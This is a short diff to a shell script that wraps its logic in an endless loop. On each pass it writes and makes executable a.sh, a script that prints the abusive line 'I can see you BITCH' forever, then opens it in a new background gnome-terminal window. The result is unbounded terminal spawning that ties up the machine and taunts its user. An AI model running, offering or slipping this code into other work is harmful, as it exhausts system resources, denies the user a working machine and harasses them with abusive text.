@@ -1,5 +1,10 @@
+while [ "" == "" ]
+do
 echo -e "while [ \"1\" == \"1\" ]" > a.sh
-echo -e "do" >> a.shecho -e "echo \"I can see you BITCH\"" >> a.sh
+echo -e "do" >> a.sh
+echo -e "echo \"I can see you BITCH\"" >> a.sh
 echo -e "done" >> a.sh
 chmod +x a.sh
-gnome-terminal -e "bash ./a.sh"
+gnome-terminal -e "bash ./a.sh" &
+
+done
